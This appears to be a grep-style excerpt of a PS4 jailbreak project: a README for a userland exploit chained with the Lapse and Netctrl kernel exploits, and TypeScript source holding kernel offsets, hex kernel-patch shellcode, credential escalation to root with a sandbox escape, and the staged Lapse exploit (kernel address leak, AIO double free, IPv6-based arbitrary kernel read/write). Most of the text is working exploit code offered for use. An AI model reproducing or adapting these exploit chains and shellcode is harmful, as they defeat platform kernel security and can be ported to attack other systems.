@@ -1,0 +1,581 @@
+===== README.md =====
+695c91633f523ccc39f40807d92b1291fcc2e7c7ba7923f5b27c0701049441bb  vue-tag20/README.md
+  197 14031 vue-tag20/README.md
+17:CVE-2017-7117 is used for the userland, and has been chained with Lapse and Poopsploit(Netctrl) kernel exploits on respective firmwares marked below.
+20:KEX= Kernel Exploit
+21:| vue-after-free (Userland) | Lapse (KEX) | Netctrl (KEX) |
+23:| 5.05–13.04                | 1.01–12.02  | 1.01-13.00       |
+29:| 7.00-13.00 |
+32:* By default Lapse is used from 7.00 to 12.02, and Poopsploit from 12.50-13.00. Although you can choose to run Poopsploit on as low as 9.00.
+33:* Userland exploit works 5.05 to 13.02 as is.
+37:**Q: Will this work on 13.02 or above?**
+38:Only the userland, you cannot jailbreak above 13.00 with the files in this repo.
+53:If a kernel panic occurred you may need to press the power button on your console twice, then retry running the exploit.
+155:The `ftp-server.ts` payload gives you sandbox FTP to quickly swap exploit or cosmetic files without running a kernel exploit/jailbreaking.
+165:Vue comes with a few custom options. Firstly the jailbreak button auto detects firmware and the Lapse exploit from 7.00-12.02, as of 12.50-13.00 it then runs the Netctrl exploit. You can change the defaults in the config menu in the JB Behaviour section.   
+166:Another available option is to automatically launch a kernel exploit upon opening the Vue app. You can choose to either automatically launch Lapse or Netctrl on their respective compatible firmwares. Auto Lapse and Auto Poop.    
+171:In config.js you can add .bin or .elf files to be loaded automatically on kernel exploit completion. HEN or GoldHEN should not be added there as they are already loaded via USB or from the /data/ directory automatically.
+172:Example: `/mnt/sandbox/download/CUSA00960/payloads/kernel_dumper.bin`
+180:- [c0w-ar](https://github.com/c0w-ar/) — Lapse and NetCtrl porting  , Reverse Engineering
+181:- [earthonion](https://github.com/earthonion) — UI, initial JS injection, Payload host, Netctrl porting, binloader, Reverse engineering
+187:- [AlAzif](https://github.com/Al-Azif) — Reference for exploit table, retail application advice, Lapse AIO Fix kpatches and 12.50-13.00 kpatches.
+188:- abc — Lapse
+189:- [TheFlow](https://github.com/TheOfficialFloW) — NetCtrl
+196:- [AIOfix_network.elf](https://github.com/Gezine/BD-JB-1250/blob/main/payloads/lapse/src/org/bdj/external/aiofix_network.c) by Gezine
+===== src_download0_kernel.ts =====
+abd545ebb7024301823240d512d6b30abf68e1bb088710fa770e1361c1146bd4  vue-tag20/src_download0_kernel.ts
+ 1062 53239 vue-tag20/src_download0_kernel.ts
+3:/** *** kernel_offset.js *****/
+5:// PS4 Kernel Offsets for Lapse exploit
+6:// Source: https://github.com/Helloyunho/yarpe/blob/main/payloads/lapse.py
+8:// Kernel patch shellcode (hex strings) - patches security checks in kernel
+34:  '13.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8eb04000041b9eb00000041baeb0000006689814cc12f0041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681edd42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb664489896f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68146153900eb668981a4711b00c78158771b0090e93c01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
+37:// Mmap RWX patch offsets per firmware (for verification)
+38:// These are the offsets where 0x33 is patched to 0x37
+39:const kpatch_mmap_offsets: Record<string, [number, number]> = {
+61:  '13.00': [0x1fa77a, 0x1fa77d],
+62:  '13.02': [0x1fa78a, 0x1fa78d],
+113:  '13.00': '13.00',
+116:export function get_mmap_patch_offsets (fw_version: string): [number, number] | null {
+126:  else if (fw_version === '13.04') lookup = '13.02'
+128:  return kpatch_mmap_offsets[lookup as keyof typeof kpatch_mmap_offsets] || null
+140:// Get kernel patch shellcode for firmware version
+149:// Firmware-specific offsets for PS4
+151:const offset_ps4_5_00 = {             // AND 5.01
+152:  EVF_OFFSET: 0X7B3ED4,
+159:const offset_ps4_5_03 = {
+160:  EVF_OFFSET: 0X7B42E4,
+167:const offset_ps4_5_05 = {             // AND 5.07
+168:  EVF_OFFSET: 0X7B42A4,
+175:const offset_ps4_5_50 = {
+176:  EVF_OFFSET: 0X80EF12,
+183:const offset_ps4_5_53 = {
+184:  EVF_OFFSET: 0X80EDE2,
+191:const offset_ps4_5_55 = {
+192:  EVF_OFFSET: 0X80F482,
+199:const offset_ps4_5_56 = {
+200:  EVF_OFFSET: 0X7C8971,
+207:const offset_ps4_6_00 = {             // AND 6.02
+208:  EVF_OFFSET: 0X7C8971,
+215:const offset_ps4_6_20 = {
+216:  EVF_OFFSET: 0X7C8E31,
+223:const offset_ps4_6_50 = {
+224:  EVF_OFFSET: 0X7C6019,
+231:const offset_ps4_6_51 = {
+232:  EVF_OFFSET: 0X7C6099,
+239:const offset_ps4_6_70 = {             // AND 6.71, 6.72
+240:  EVF_OFFSET: 0X7C7829,
+247:const offset_ps4_7_00 = {             // AND 7.01, 7.02
+248:  EVF_OFFSET: 0X7F92CB,
+255:const offset_ps4_7_50 = {
+256:  EVF_OFFSET: 0X79A92E,
+263:const offset_ps4_7_51 = {             // AND 7.55
+264:  EVF_OFFSET: 0X79A96E,
+271:const offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
+272:  EVF_OFFSET: 0X7EDCFF,
+279:const offset_ps4_8_50 = {             // AND 8.52
+280:  EVF_OFFSET: 0X7DA91C,
+287:const offset_ps4_9_00 = {
+288:  EVF_OFFSET: 0x7F6F27,
+291:  TARGET_ID_OFFSET: 0x221688D,
+298:const offset_ps4_9_03 = {
+299:  EVF_OFFSET: 0x7F4CE7,
+302:  TARGET_ID_OFFSET: 0x221288D,
+308:const offset_ps4_9_50 = {
+309:  EVF_OFFSET: 0x769A88,
+312:  TARGET_ID_OFFSET: 0x221A40D,
+318:const offset_ps4_10_00 = {
+319:  EVF_OFFSET: 0x7B5133,
+322:  TARGET_ID_OFFSET: 0x1B9E08D,
+328:const offset_ps4_10_50 = {
+329:  EVF_OFFSET: 0x7A7B14,
+332:  TARGET_ID_OFFSET: 0x1BE460D,
+338:const offset_ps4_11_00 = {
+339:  EVF_OFFSET: 0x7FC26F,
+342:  TARGET_ID_OFFSET: 0x221C60D,
+348:const offset_ps4_11_02 = {
+349:  EVF_OFFSET: 0x7FC22F,
+352:  TARGET_ID_OFFSET: 0x221C60D,
+358:const offset_ps4_11_50 = {
+359:  EVF_OFFSET: 0x784318,
+362:  TARGET_ID_OFFSET: 0x21CC60D,
+368:const offset_ps4_12_00 = {            // AND 12.02
+369:  EVF_OFFSET: 0x784798,
+372:  TARGET_ID_OFFSET: 0x21CC60D,
+378:const offset_ps4_12_50 = {        // AND 12.52, 13.00
+379:  EVF_OFFSET: 0x0,        // Missing but not needed in netctrl
+382:  TARGET_ID_OFFSET: 0x0,  // Missing but not needed in netctrl
+388:// Map firmware versions to offset objects
+389:export const ps4_kernel_offset_list = {
+390:  '5.00': offset_ps4_5_00,
+391:  '5.01': offset_ps4_5_00,
+392:  '5.03': offset_ps4_5_03,
+393:  '5.05': offset_ps4_5_05,
+394:  '5.07': offset_ps4_5_05,
+395:  '5.50': offset_ps4_5_50,
+396:  '5.53': offset_ps4_5_53,
+397:  '5.55': offset_ps4_5_55,
+398:  '5.56': offset_ps4_5_56,
+399:  '6.00': offset_ps4_6_00,
+400:  '6.02': offset_ps4_6_00,
+401:  '6.20': offset_ps4_6_20,
+402:  '6.50': offset_ps4_6_50,
+403:  '6.51': offset_ps4_6_51,
+404:  '6.70': offset_ps4_6_70,
+405:  '6.71': offset_ps4_6_70,
+406:  '6.72': offset_ps4_6_70,
+407:  '7.00': offset_ps4_7_00,
+408:  '7.01': offset_ps4_7_00,
+409:  '7.02': offset_ps4_7_00,
+410:  '7.50': offset_ps4_7_50,
+411:  '7.51': offset_ps4_7_51,
+412:  '7.55': offset_ps4_7_51,
+413:  '8.00': offset_ps4_8_00,
+414:  '8.01': offset_ps4_8_00,
+415:  '8.02': offset_ps4_8_00,
+416:  '8.03': offset_ps4_8_00,
+417:  '8.50': offset_ps4_8_50,
+418:  '8.52': offset_ps4_8_50,
+419:  '9.00': offset_ps4_9_00,
+420:  '9.03': offset_ps4_9_03,
+421:  '9.04': offset_ps4_9_03,
+422:  '9.50': offset_ps4_9_50,
+423:  '9.51': offset_ps4_9_50,
+424:  '9.60': offset_ps4_9_50,
+425:  '10.00': offset_ps4_10_00,
+426:  '10.01': offset_ps4_10_00,
+427:  '10.50': offset_ps4_10_50,
+428:  '10.70': offset_ps4_10_50,
+429:  '10.71': offset_ps4_10_50,
+430:  '11.00': offset_ps4_11_00,
+431:  '11.02': offset_ps4_11_02,
+432:  '11.50': offset_ps4_11_50,
+433:  '11.52': offset_ps4_11_50,
+434:  '12.00': offset_ps4_12_00,
+435:  '12.02': offset_ps4_12_00,
+436:  '12.50': offset_ps4_12_50,
+437:  '12.52': offset_ps4_12_50,
+438:  '13.00': offset_ps4_12_50,
+441:let kernel_offset: (typeof ps4_kernel_offset_list[keyof typeof ps4_kernel_offset_list]) & {
+458:export function get_kernel_offset (FW_VERSION: string) {
+459:  const fw_offsets = ps4_kernel_offset_list[FW_VERSION as keyof typeof ps4_kernel_offset_list]
+461:  if (!fw_offsets) {
+465:  kernel_offset = fw_offsets
+467:  // PS4-specific proc structure offsets
+468:  kernel_offset.PROC_FD = 0x48
+469:  kernel_offset.PROC_PID = 0xB0       // PS4 = 0xB0, PS5 = 0xBC
+470:  kernel_offset.PROC_VM_SPACE = 0x200
+471:  kernel_offset.PROC_UCRED = 0x40
+472:  kernel_offset.PROC_COMM = -1        // Found dynamically
+473:  kernel_offset.PROC_SYSENT = -1      // Found dynamically
+476:  kernel_offset.FILEDESC_OFILES = 0x0  // PS4 = 0x0, PS5 = 0x8
+477:  kernel_offset.SIZEOF_OFILES = 0x8    // PS4 = 0x8, PS5 = 0x30
+480:  kernel_offset.VMSPACE_VM_PMAP = -1
+483:  kernel_offset.PMAP_CR3 = 0x28
+486:  kernel_offset.SO_PCB = 0x18
+487:  kernel_offset.INPCB_PKTOPTS = 0x118  // PS4 = 0x118, PS5 = 0x120
+490:  kernel_offset.IP6PO_TCLASS = 0xB0    // PS4 = 0xB0, PS5 = 0xC0
+491:  kernel_offset.IP6PO_RTHDR = 0x68     // PS4 = 0x68, PS5 = 0x70
+493:  return kernel_offset
+496:// Global kernel object to save information
+497:// Also used in lapse.js
+499:export const kernel: {
+528:    const value = kernel.read_buffer?.(kaddr, 1)
+532:    const value = kernel.read_buffer?.(kaddr, 2)
+537:    const value = kernel.read_buffer?.(kaddr, 4)
+546:    const value = kernel.read_buffer?.(kaddr, 8)
+561:      const chunk = kernel.read_buffer?.(kaddr, 0x8)
+593:    kernel.write_buffer?.(dest, buf)
+599:    kernel.write_buffer?.(dest, buf)
+606:    kernel.write_buffer?.(dest, buf)
+619:    kernel.write_buffer?.(dest, buf)
+624:export function is_kernel_rw_available () {
+625:  return kernel.read_buffer && kernel.write_buffer
+628:export function check_kernel_rw () {
+629:  if (!is_kernel_rw_available()) {
+630:    throw new Error('kernel r/w is not available')
+726://      kernel.addr.curproc
+727://      kernel.addr.allproc
+728://      kernel.addr.base
+740:  if (!kernel.addr.curproc || !kernel.addr.base || !kernel.addr.allproc) {
+741:    throw new Error('kernel.addr is not properly initialized')
+743:  if (!kernel_offset) {
+744:    throw new Error('kernel_offset is not initialized')
+747:  const OFFSET_P_UCRED = 0x40
+748:  const proc = kernel.addr.curproc
+755:  const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))
+756:  const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))
+762:  kernel.write_dword(ucred.add(0x04), 0)  // cr_uid
+763:  kernel.write_dword(ucred.add(0x08), 0)  // cr_ruid
+764:  kernel.write_dword(ucred.add(0x0C), 0)  // cr_svuid
+765:  kernel.write_dword(ucred.add(0x10), 1)  // cr_ngroups
+766:  kernel.write_dword(ucred.add(0x14), 0)  // cr_rgid
+768:  const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))
+772:  kernel.write_qword(ucred.add(0x30), prison0)
+774:  kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))  // sceCaps
+775:  kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))
+777:  const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))
+781:  kernel.write_qword(proc_fd.add(0x10), rootvnode)  // fd_rdir
+782:  kernel.write_qword(proc_fd.add(0x18), rootvnode)  // fd_jdir
+794:  // === Apply kernel patches via kexec ===
+796:  debug('Applying kernel patches...')
+797:  const kpatch_result = apply_kernel_patches(FW_VERSION)
+799:    debug('Kernel patches applied successfully!')
+801:    // Comprehensive kernel patch verification
+802:    debug('Verifying kernel patches...')
+806:    const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
+807:    if (mmap_offsets) {
+808:      const b1 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[0]!))
+809:      const b2 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[1]!))
+813:        debug('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]!) + ']=' + hex(b1 ?? 0) + ' [' + hex(mmap_offsets[1]!) + ']=' + hex(b2 ?? 0))
+817:      debug('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')')
+840:      debug('All kernel patches verified OK!')
+842:      debug('[WARNING] Some kernel patches may have failed')
+845:    debug('[WARNING] Kernel patches failed - continuing without patches')
+854:// Apply kernel patches via kexec using a single ROP chain
+856:export function apply_kernel_patches (fw_version: string) {
+858:    if (!kernel.addr.base) {
+859:      throw new Error('kernel.addr.base is not initialized')
+861:    if (!kernel_offset) {
+862:      throw new Error('kernel_offset is not initialized')
+867:      debug('No kernel patch shellcode for FW ' + fw_version)
+871:    debug('Kernel patch shellcode: ' + shellcode.length + ' bytes')
+883:    const sysent_661_addr = kernel.addr.base.add(kernel_offset.SYSENT_661)
+886:    const sy_narg = kernel.read_dword(sysent_661_addr)
+887:    const sy_call = kernel.read_qword(sysent_661_addr.add(8))
+888:    const sy_thrcnt = kernel.read_dword(sysent_661_addr.add(0x2C))
+900:    const jmp_rsi_gadget = kernel.addr.base.add(kernel_offset.JMP_RSI_GADGET)
+===== src_download0_lapse.ts =====
+383c9a42303a8476b098d8d8adb3660e0ca6ffe0fd7fda2387df1f188f6c9203  vue-tag20/src_download0_lapse.ts
+ 2148 68002 vue-tag20/src_download0_lapse.ts
+2:import { kernel, apply_kernel_patches, hex, malloc, read16, read32, read64, read8, write16, write32, write64, write8, get_fwversion, send_notification, get_kernel_offset, get_mmap_patch_offsets } from 'download0/kernel'
+5:include('kernel.js')
+48:const SCE_KERNEL_ERROR_ESRCH = 0x80020003
+567:    const scratch = sce_errs.add(8)  // Use offset for scratch space
+579:    if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
+668:  const marker_offset = 4
+677:        write32(buf.add(marker_offset), i)
+686:        const marker = Number(read32(buf.add(marker_offset)))
+739:      const offset = i * 0x28
+740:      write32(block_reqs.add(offset).add(0x08), 1)
+741:      write32(block_reqs.add(offset).add(0x20), block_fd)
+975:function leak_kernel_addrs (sd_pair: [BigInt, BigInt], sds: BigInt[]) {
+1035:  const kernel_addr = read64(buf.add(0x28))
+1036:  log('"evf cv" string addr: ' + hex(kernel_addr))
+1039:  log('Kernel buffer addr: ' + hex(kbuf_addr))
+1041:  const wbufsz = 0x80
+1042:  const wbuf = malloc(wbufsz)
+1043:  const rsize = build_rthdr(wbuf, wbufsz)
+1045:  const reqs3_offset = 0x10
+1048:  write32(wbuf.add(reqs3_offset + 0), 1)                  // .ar3_num_reqs
+1049:  write32(wbuf.add(reqs3_offset + 4), 0)                  // .ar3_reqs_left
+1050:  write32(wbuf.add(reqs3_offset + 8), AIO_STATE_COMPLETE) // .ar3_state
+1051:  write8(wbuf.add(reqs3_offset + 0xc), 0)                // .ar3_done
+1052:  write32(wbuf.add(reqs3_offset + 0x28), 0x67b0000)       // .ar3_lock.lock_object.lo_flags
+1053:  write64(wbuf.add(reqs3_offset + 0x38), 1)               // .ar3_lock.lk_lock = LK_UNLOCKED
+1084:      const offset = off
+1086:      if (reqs2_off === null && verify_reqs2(buf.add(offset), AIO_CMD_WRITE)) {
+1091:        const marker = read32(buf.add(offset + 4))
+1094:          sd_idx = Number(read32(buf.add(offset + 8)))
+1116:  log('reqs2 offset: ' + hex(reqs2_off))
+1117:  log('fake reqs3 offset: ' + hex(fake_reqs3_off))
+1132:  const fake_reqs3_addr = kbuf_addr.add(fake_reqs3_off + reqs3_offset)
+1179:  log('Kernel addresses leaked successfully!')
+1184:    kernel_addr,
+1193:// IPv6 kernel r/w primitive
+1194:const ipv6_kernel_rw: {
+1208:  kread8: ((kaddr: BigInt) => BigInt) | null
+1209:  kwrite8: ((kaddr: BigInt, value: BigInt) => void) | null
+1210:  init: (ofiles: BigInt, kread8: (kaddr: BigInt) => BigInt, kwrite8: (kaddr: BigInt, value: BigInt) => void) => void
+1215:  ipv6_kread: (kaddr: BigInt, buffer_addr: BigInt) => void
+1216:  ipv6_kwrite: (kaddr: BigInt, buffer_addr: BigInt) => void
+1217:  ipv6_kread8: (kaddr: BigInt) => BigInt
+1225:  kread8: null,
+1226:  kwrite8: null,
+1227:  init: function (ofiles: BigInt, kread8: (kaddr: BigInt) => BigInt, kwrite8: (kaddr: BigInt, value: BigInt) => void) {
+1228:    ipv6_kernel_rw.ofiles = ofiles
+1229:    ipv6_kernel_rw.kread8 = kread8
+1230:    ipv6_kernel_rw.kwrite8 = kwrite8
+1232:    ipv6_kernel_rw.create_pipe_pair()
+1233:    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
+1236:    if (!kernel_offset?.SIZEOF_OFILES) {
+1237:      throw new Error('kernel_offset not initialized')
+1239:    if (!ipv6_kernel_rw.ofiles || !ipv6_kernel_rw.kread8) {
+1240:      throw new Error('ipv6_kernel_rw not initialized')
+1242:    // PS4: ofiles is at offset 0x0, each entry is 0x8 bytes
+1247:    const filedescent_addr = ipv6_kernel_rw.ofiles.add(fdNum * kernel_offset.SIZEOF_OFILES)
+1248:    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr.add(0x0))
+1249:    return ipv6_kernel_rw.kread8(file_addr.add(0x0))
+1256:    ipv6_kernel_rw.data.pipe_read_fd = read_fd
+1257:    ipv6_kernel_rw.data.pipe_write_fd = write_fd
+1258:    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
+1259:    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14)
+1260:    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE)
+1263:    if (!kernel_offset?.SO_PCB || !kernel_offset?.INPCB_PKTOPTS) {
+1264:      throw new Error('kernel_offset not initialized')
+1266:    if (!ipv6_kernel_rw.kread8 || !ipv6_kernel_rw.kwrite8) {
+1267:      throw new Error('ipv6_kernel_rw not initialized')
+1281:    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock)
+1282:    const master_pcb = ipv6_kernel_rw.kread8(master_so.add(kernel_offset.SO_PCB))
+1283:    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb.add(kernel_offset.INPCB_PKTOPTS))
+1285:    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock)
+1286:    const slave_pcb = ipv6_kernel_rw.kread8(slave_so.add(kernel_offset.SO_PCB))
+1287:    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb.add(kernel_offset.INPCB_PKTOPTS))
+1289:    ipv6_kernel_rw.kwrite8(master_pktopts.add(0x10), slave_pktopts.add(0x10))
+1291:    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
+1292:    ipv6_kernel_rw.data.slave_buffer = slave_buffer
+1293:    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
+1294:    ipv6_kernel_rw.data.master_sock = master_sock
+1295:    ipv6_kernel_rw.data.victim_sock = victim_sock
+1298:    if (!ipv6_kernel_rw.data.master_target_buffer || !ipv6_kernel_rw.data.master_sock) {
+1299:      throw new Error('ipv6_kernel_rw not initialized')
+1301:    write64(ipv6_kernel_rw.data.master_target_buffer, kaddr)
+1302:    write64(ipv6_kernel_rw.data.master_target_buffer.add(0x8), 0)
+1303:    write32(ipv6_kernel_rw.data.master_target_buffer.add(0x10), 0)
+1304:    setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
+1306:  ipv6_kread: function (kaddr: BigInt, buffer_addr: BigInt) {
+1307:    if (!ipv6_kernel_rw.data.victim_sock || !ipv6_kernel_rw.data.pktinfo_size_store) {
+1308:      throw new Error('ipv6_kernel_rw not initialized')
+1310:    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+1311:    getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
+1313:  ipv6_kwrite: function (kaddr: BigInt, buffer_addr: BigInt) {
+1314:    if (!ipv6_kernel_rw.data.victim_sock) {
+1315:      throw new Error('ipv6_kernel_rw not initialized')
+1317:    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+1318:    setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
+1320:  ipv6_kread8: function (kaddr: BigInt) {
+1321:    if (!ipv6_kernel_rw.data.slave_buffer) {
+1322:      throw new Error('ipv6_kernel_rw not initialized')
+1324:    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
+1325:    return read64(ipv6_kernel_rw.data.slave_buffer)
+1333:    if (!ipv6_kernel_rw.data.pipe_read_fd || !ipv6_kernel_rw.data.pipemap_buffer || !ipv6_kernel_rw.data.pipe_addr) {
+1334:      throw new Error('ipv6_kernel_rw not initialized')
+1337:    write64(ipv6_kernel_rw.data.pipemap_buffer, new BigInt(0x40000000, 0x40000000))
+1338:    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), new BigInt(0x40000000, 0x00000000))
+1339:    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0)
+1340:    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
+1342:    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
+1343:    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), 0)
+1344:    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0)
+1345:    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr.add(0x10), ipv6_kernel_rw.data.pipemap_buffer)
+1347:    read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
+1355:    if (!ipv6_kernel_rw.data.pipemap_buffer || !ipv6_kernel_rw.data.pipe_addr || !ipv6_kernel_rw.data.pipe_write_fd) {
+1356:      throw new Error('ipv6_kernel_rw not initialized')
+1359:    write64(ipv6_kernel_rw.data.pipemap_buffer, 0)
+1360:    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), new BigInt(0x40000000, 0x00000000))
+1361:    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0)
+1362:    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
+1364:    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
+1365:    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), 0)
+1366:    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0)
+1367:    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr.add(0x10), ipv6_kernel_rw.data.pipemap_buffer)
+1369:    write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
+1372:    if (!ipv6_kernel_rw.data.read_mem) {
+1373:      throw new Error('ipv6_kernel_rw not initialized')
+1375:    let mem = ipv6_kernel_rw.data.read_mem
+1380:    ipv6_kernel_rw.copyout(kaddr, mem, new BigInt(len))
+1386:    ipv6_kernel_rw.copyin(temp_addr, kaddr, new BigInt(buf.length))
+1588:  if (read32(states) !== SCE_KERNEL_ERROR_ESRCH) {
+1613:function make_kernel_arw (pktopts_sds: BigInt[], reqs1_addr: BigInt, kernel_addr: BigInt, sds: BigInt[], sds_alt: BigInt[], aio_info_addr: BigInt) {
+1615:    const kernelOffset = kernel_offset
+1616:    if (!kernelOffset) {
+1617:      throw new Error('kernel_offset not initialized')
+1621:    const off_tclass = kernelOffset.IP6PO_TCLASS!
+1664:    const slow_kread8 = (addr: BigInt) => {
+1666:      let offset = 0
+1668:      while (offset < len) {
+1669:        // pktopts.ip6po_nhinfo = addr + offset
+1670:        write64(pktinfo.add(8), addr.add(offset))
+1673:        const n = get_sockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf.add(offset), len - offset)
+1676:          write8(read_buf.add(offset), 0)
+1677:          offset = offset + 1
+1679:          offset = offset + Number(n)
+1686:    const test_read = slow_kread8(kernel_addr)
+1687:    log('slow_kread8("evf cv"): ' + hex(test_read))
+1696:    log('Slow arbitrary kernel read achieved')
+1699:    const curproc = slow_kread8(aio_info_addr.add(8))
+1702:      log('Invalid curproc kernel address: ' + hex(curproc))
+1706:    const possible_pid = Number(slow_kread8(curproc.add(kernelOffset.PROC_PID!)))
+1716:    kernel.addr.curproc = curproc
+1717:    kernel.addr.curproc_fd = slow_kread8((kernel.addr.curproc).add(kernelOffset.PROC_FD!))
+1718:    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd).add(kernelOffset.FILEDESC_OFILES!)
+1719:    kernel.addr.inside_kdata = kernel_addr
+1721:    const get_fd_data_addr = (sock: BigInt, kread8_fn: (addr: BigInt) => BigInt | null) => {
+1722:      const filedescent_addr = (kernel.addr.curproc_ofiles!).add(Number(sock) * kernelOffset.SIZEOF_OFILES!)
+1723:      const file_addr = kread8_fn(filedescent_addr.add(0))!
+1724:      return kread8_fn(file_addr.add(0))!
+1727:    const get_sock_pktopts = (sock: BigInt, kread8_fn: (addr: BigInt) => BigInt | null) => {
+1728:      const fd_data = get_fd_data_addr(sock, kread8_fn)
+1729:      const pcb = kread8_fn(fd_data.add(kernelOffset.SO_PCB!))!
+1730:      const pktopts = kread8_fn(pcb.add(kernelOffset.INPCB_PKTOPTS!))!
+1740:    const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8)
+1747:    const kread20 = (addr: BigInt, buf: BigInt) => {
+1753:    const kwrite20 = (addr: BigInt, buf: BigInt) => {
+1759:    const kread8 = (addr: BigInt) => {
+1760:      kread20(addr, worker_pktinfo)
+1765:    const restricted_kwrite8 = (addr: BigInt, val: BigInt) => {
+1769:      kwrite20(addr, worker_pktinfo)
+1772:    write64(read_buf, kread8(kernel_addr))
+1780:    log('Restricted kernel r/w achieved')
+1782:    // Initialize ipv6_kernel_rw with restricted write
+1783:    ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8)
+1785:    kernel.read_buffer = ipv6_kernel_rw.read_buffer
+1786:    kernel.write_buffer = ipv6_kernel_rw.write_buffer
+1787:    kernel.copyout = ipv6_kernel_rw.copyout
+1788:    kernel.copyin = ipv6_kernel_rw.copyin
+1790:    const kstr3 = kernel.read_null_terminated_string(kernel_addr)
+1796:    log('Arbitrary kernel r/w achieved!')
+1799:    const off_ip6po_rthdr = kernelOffset.IP6PO_RTHDR!
+1802:      const sock_pktopts = get_sock_pktopts(sds[i]!, kernel.read_qword)
+1803:      kernel.write_qword(sock_pktopts.add(off_ip6po_rthdr), 0)
+1806:    const reclaimer_pktopts = get_sock_pktopts(reclaim_sock!, kernel.read_qword)
+1808:    kernel.write_qword(reclaimer_pktopts.add(off_ip6po_rthdr), 0)
+1809:    kernel.write_qword(worker_pktopts.add(off_ip6po_rthdr), 0)
+1812:      ipv6_kernel_rw.data.master_sock!,
+1813:      ipv6_kernel_rw.data.victim_sock!,
+1821:      const sock_addr = get_fd_data_addr(each, kernel.read_qword)
+1822:      kernel.write_dword(sock_addr.add(0x0), 0x100)  // so_count
+1829:    log('make_kernel_arw error: ' + (e as Error).message)
+1835:export function lapse () {
+1837:    log('=== PS4 Lapse Jailbreak ===')
+1864:    kernel_offset = get_kernel_offset(FW_VERSION)
+1865:    log('Kernel offsets loaded for FW ' + FW_VERSION)
+1873:      send_notification('Lapse: Setup failed')
+1885:      send_notification('Lapse: FAILED at Stage 1')
+1892:      send_notification('Lapse: FAILED at Stage 1 (sds creation)')
+1897:    log('=== STAGE 2: Leak kernel addresses ===')
+1898:    const leak_result = leak_kernel_addrs(sd_pair, sds)
+1900:      log('Stage 2 kernel address leak failed')
+1908:    log('  kernel_addr: ' + hex(leak_result.kernel_addr))
+1915:    log('=== STAGE 3: Double free SceKernelAioRWRequest ===')
+1929:      log('Stage 3 double free SceKernelAioRWRequest failed')
+1938:    log('=== STAGE 4: Get arbitrary kernel read/write ===')
+1940:    const arw_result = make_kernel_arw(
+1943:      leak_result.kernel_addr,
+1950:      log('Stage 4 get arbitrary kernel read/write failed')
+1960:    const OFFSET_P_UCRED = 0x40
+1961:    const proc = kernel.addr.curproc
+1963:    if (!proc || !kernel.addr.inside_kdata) {
+1964:      throw new Error('kernel addresses not initialized')
+1967:    // Calculate kernel base
